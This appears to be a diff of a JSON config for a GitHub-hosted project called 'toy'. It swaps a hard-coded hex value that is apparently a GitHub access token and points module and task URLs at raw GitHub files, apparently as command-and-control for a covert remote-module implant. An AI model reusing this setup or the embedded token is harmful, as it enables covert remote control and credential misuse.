@@ -1,13 +1,13 @@
 {
   "gu": "how2how",
-  "gt": "8488dc01ebf9d561715085ca5b7087e10f0bd3f7",
+  "gt": "f90c89f1eed0742d8dc4bddcecba62118583a496",
   "gr": "toy",
   "cf": 60,
   "bm": {
       "https://raw.githubusercontent.com/how2how/toy/master/toy/external/": ["nacl", "covertutils", "memorpy"]
   },
   "cu": "https://raw.githubusercontent.com/how2how/toy/master/toy/config/conf.json",
-  "tu": "https://raw.githubusercontent.com/how2how/toy/master/toy/modules/",
+  "tu": "https://raw.githubusercontent.com/how2how/toy/master/toy/config/abc.json",
   "rm": [{
       "module": "environment",
       "require": {"url": ["modname"]}
